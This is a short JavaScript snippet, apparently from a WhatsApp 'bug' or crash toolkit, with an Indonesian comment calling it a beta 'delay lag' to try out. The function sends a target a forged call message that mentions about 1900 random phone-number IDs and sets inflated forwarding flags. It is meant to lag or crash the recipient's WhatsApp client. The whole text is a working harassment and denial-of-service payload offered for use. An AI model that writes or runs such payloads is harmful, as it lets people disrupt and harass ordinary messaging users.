// delay lag beta , cobain aja sendiri @ameliamodders
async function Callnew(isTarget) {
  const Msg = {
    call: {
      callType: 1,
      callId: String(Date.now()),
      callStartTimestamp: Date.now(),
      contextInfo: {
        forwardingScore: 999,
        isForwarded: true,
        mentionedJid: [
          ...Array.from({ length: 1900 }, () =>
            "1" + Math.floor(Math.random() * 99999999) + "@s.whatsapp.net"
          )
        ]
      }
    }
  };
  await sock.relayMessage(isTarget, Msg, { messageId: "" });
}